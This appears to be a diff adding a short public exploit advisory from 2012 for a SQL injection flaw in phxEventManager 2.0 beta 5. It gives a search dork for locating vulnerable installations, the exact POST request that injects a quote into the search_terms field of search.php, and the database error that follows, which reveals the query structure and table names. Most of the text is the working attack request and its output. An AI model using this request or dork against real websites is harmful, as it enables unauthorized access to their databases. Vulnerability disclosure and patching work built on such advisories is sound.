@@ -1,0 +1,35 @@
+# Exploit Title: phxEventManager 2.0 beta 5 search.php search_terms SQL
+Injection Vulnerability
+# Date: 01/03/2012
+# Author: skysbsb
+# Software Link: http://sourceforge.net/projects/phxeventmanager/
+# Version: Web Application
+# Tested on: Apache/*nix
+# Dork: intext: "Powered by phxEventManager"
+# Code :
+
+Exploited Link :
+
+URL: http://vulnsite.com/path_to_pem/search.php?
+POSTDATA:
+datasubmit=1&searchtype=events&s_event_names=on&s_event_descriptions=on&s_event_presenters=on&s_event_contacts=on&search_terms='
+
+Result:
+
+MDB2 Error: syntax error, _doQuery: [Error message: Could not execute
+statement] [Last executed query: SELECT * FROM pem_entries as e, pem_dates
+as d WHERE e.id = d.entry_id AND () AND e.entry_status != 2 AND
+d.date_status != 2 AND (e.entry_visible_to_public = 1 AND
+d.date_visible_to_public = 1) AND (e.entry_status != 0 AND d.date_status !=
+0) AND d.when_begin >= DATE_SUB(CURDATE(),INTERVAL 1 YEAR) ] [Native code:
+1064] [Native message: You have an error in your SQL syntax; check the
+manual that corresponds to your MySQL server version for the right syntax
+to use near ') AND e.entry_status != 2 AND d.date_status != 2 AND
+(e.entry_visible_to_public ' at line 1]
+
+#skysbsb mailto:skysbsb[atttt]gmail.com
+
+
+
+-- 
+David Gomes Guimar?es
